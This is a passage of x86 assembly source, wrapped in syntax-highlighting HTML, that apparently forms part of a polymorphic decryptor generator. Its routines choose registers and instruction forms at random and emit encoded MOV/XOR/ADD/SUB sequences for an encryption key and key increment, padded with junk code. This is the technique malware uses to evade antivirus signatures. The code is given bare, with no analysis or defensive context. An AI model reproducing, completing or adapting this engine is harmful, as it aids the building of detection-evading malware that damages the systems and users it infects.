    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next3</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV reg, random_value</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;XOR reg, value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;param = random_value xor value</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_next0</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">             </span><span class="sc1">;PUSH random_value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP reg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;XOR reg, value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;result = random_value xor value</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV EAX, random_value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;MOV reg, EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;SUB reg, value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;result = random_value - value</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_next2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;XOR reg, random_value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;ADD reg, value</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;result = random_value + value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">s_lbl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_lbl</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">             </span><span class="sc1">;create ADD reg, ... instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">s_next3</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;ADD reg, random_value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;XOR reg, value</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;result = random_value xor value</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">s_lbl</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc5">n_end2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">
</span><span class="sc5">greg2</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg3</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;get register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;already used ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;get encryption key value</span><span class="sc0">
</span><span class="sc5">xor_key</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_next2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">              </span><span class="sc1">;OR, ADD, XOR reg, value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_nxt2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_nxt3</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
</span><span class="sc5">k_nxt1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">n_end1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">k_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">k_nxt2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_nxt1</span><span class="sc0">
</span><span class="sc5">k_nxt3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_nxt1</span><span class="sc0">
</span><span class="sc5">k_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV reg, value</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_nxt1</span><span class="sc0">
</span><span class="sc5">k_next2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">             </span><span class="sc1">;PUSH value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP reg</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg3</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg4</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;get key increment value</span><span class="sc0">
</span><span class="sc5">key_inc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">i_next</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_next0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_next2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">              </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;OR reg, EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;ADD reg, value</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">i_next0</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">             </span><span class="sc1">;ADD reg, value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end1</span><span class="sc0">
</span><span class="sc5">i_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV EAX, value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;ADD reg, EAX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">i_end1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">i_end2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">i_next2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">             </span><span class="sc1">;MOV EAX, reg</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;ADD EAX, value</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">                </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg4</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg5</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ng5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i_next</span><span class="sc0">             </span><span class="sc1">;same as previous, value=4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_end</span><span class="sc0">
</span><span class="sc5">ng5</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">;4x inc reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg5</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg6</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d_next0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d_next2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">             </span><span class="sc1">;SUB reg, 1</span><span class="sc0">
